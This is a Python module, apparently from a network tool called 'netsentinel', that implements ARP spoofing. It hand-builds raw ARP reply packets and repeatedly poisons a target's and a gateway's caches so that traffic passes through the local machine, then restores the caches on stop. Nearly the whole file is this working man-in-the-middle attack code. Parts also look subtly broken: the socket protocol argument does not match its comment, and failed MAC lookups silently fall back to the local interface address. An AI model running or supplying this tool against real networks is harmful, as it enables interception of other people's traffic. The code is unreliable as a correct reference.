import logging
import socket  # nosec B404
import struct
import threading
import time
from pathlib import Path
from typing import Any

from netsentinel.utils.subprocess_safe import safe_run


class ArpPacketBuilder:
    @staticmethod
    def build_arp_reply(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> bytes:
        """
        Packs raw bytes for a standard L2 ARP reply packet.
        """
        # Ethernet Header
        # dst mac (6B), src mac (6B), EtherType (0x0806 = ARP, 2B)
        dst_mac_bytes = ArpPacketBuilder.mac_to_bytes(dst_mac)
        src_mac_bytes = ArpPacketBuilder.mac_to_bytes(src_mac)
        eth_header = dst_mac_bytes + src_mac_bytes + b"\x08\x06"

        # ARP Payload
        # HTYPE = Ethernet (1, 2B), PTYPE = IPv4 (0x0800, 2B), HLEN = 6, PLEN = 4
        # OP = Reply (2, 2B)
        # Sender MAC (6B), Sender IP (4B), Target MAC (6B), Target IP (4B)
        arp_payload = struct.pack(
            ">HHBBH",
            1,  # Hardware Type
            0x0800,  # Protocol Type
            6,  # Hardware Size
            4,  # Protocol Size
            2,  # Opcode (2 = Reply)
        )
        sender_ip_bytes = ArpPacketBuilder.ip_to_bytes(src_ip)
        target_ip_bytes = ArpPacketBuilder.ip_to_bytes(dst_ip)
        target_mac_bytes = ArpPacketBuilder.mac_to_bytes(dst_mac)

        return (
            eth_header
            + arp_payload
            + src_mac_bytes
            + sender_ip_bytes
            + target_mac_bytes
            + target_ip_bytes
        )

    @staticmethod
    def mac_to_bytes(mac: str) -> bytes:
        return bytes(int(x, 16) for x in mac.split(":"))

    @staticmethod
    def ip_to_bytes(ip: str) -> bytes:
        return socket.inet_aton(ip)


class ArpSpoofer:
    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.is_running = False
        self.thread: Any = None

        # Cache resolving
        self.local_mac = ""
        self.target_mac = ""
        self.gateway_mac = ""

    def _resolve_mac(self, ip: str) -> str:
        """
        Resolves MAC address via system arp cache or active ping.
        """
        try:
            # Query local ARP table first
            res = safe_run(["ip", "neigh", "show", ip], timeout=5.0)
            for line in res.stdout.splitlines():
                if "lladdr" in line:
                    parts = line.split()
                    idx = parts.index("lladdr")
                    if idx + 1 < len(parts):
                        return parts[idx + 1]
        except Exception:  # nosec B110
            pass

        # Try mapping using interface info
        try:
            addr_file = Path(f"/sys/class/net/{self.interface}/address")
            with addr_file.open() as f:
                return f.read().strip()
        except Exception:  # nosec B110
            pass

        return "00:00:00:00:00:00"

    def start(self) -> None:
        """
        Starts the ARP poisoning thread loop.
        """
        self.local_mac = self._resolve_mac("127.0.0.1")  # local interface mac
        self.target_mac = self._resolve_mac(self.target_ip)
        self.gateway_mac = self._resolve_mac(self.gateway_ip)

        if self.target_mac == "00:00:00:00:00:00" or self.gateway_mac == "00:00:00:00:00:00":
            raise RuntimeError("Failed to resolve target or gateway MAC addresses.")

        self.is_running = True
        self.thread = threading.Thread(target=self._poison_loop, daemon=True)
        self.thread.start()
        logging.info("ARP Spoofing started: %s <-> %s", self.target_ip, self.gateway_ip)

    def _poison_loop(self) -> None:
        # Create Raw Socket (requires cap_net_raw or root)
        try:
            # Protocol = 0x0806 (ARP) in network byte order
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
            sock.bind((self.interface, 0))
        except Exception as e:
            logging.critical("Failed to create raw socket for ARP spoof: %s", e)
            self.is_running = False
            return

        # Build packets
        # Tell Target that we are Gateway
        pkt_target = ArpPacketBuilder.build_arp_reply(
            self.local_mac, self.gateway_ip, self.target_mac, self.target_ip
        )
        # Tell Gateway that we are Target
        pkt_gateway = ArpPacketBuilder.build_arp_reply(
            self.local_mac, self.target_ip, self.gateway_mac, self.gateway_ip
        )

        with sock:
            while self.is_running:
                try:
                    sock.send(pkt_target)
                    sock.send(pkt_gateway)
                except Exception as e:
                    logging.error("Failed to send ARP packets: %s", e)
                time.sleep(2.0)

    def stop(self) -> None:
        """
        Stops the poisoning thread and restores the ARP cache (RE-05).
        """
        self.is_running = False
        if self.thread:
            self.thread.join(timeout=3.0)
            self.thread = None

        # Unpoison/Restore Loop (RE-05)
        self.restore()

    def restore(self) -> None:
        """
        Sends restoration packets mapping true addresses (RE-05).
        """
        if not self.target_mac or not self.gateway_mac:
            return

        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
            sock.bind((self.interface, 0))
        except Exception:
            return

        # Restore Target: Gateway IP maps to Gateway MAC
        pkt_target = ArpPacketBuilder.build_arp_reply(
            self.gateway_mac, self.gateway_ip, self.target_mac, self.target_ip
        )
        # Restore Gateway: Target IP maps to Target MAC
        pkt_gateway = ArpPacketBuilder.build_arp_reply(
            self.target_mac, self.target_ip, self.gateway_mac, self.gateway_ip
        )

        with sock:
            # Send multiple times to guarantee delivery
            for _ in range(3):
                try:
                    sock.send(pkt_target)
                    sock.send(pkt_gateway)
                except Exception:  # nosec B110
                    pass
                time.sleep(0.1)

        logging.info("ARP cache successfully restored (RE-05).")
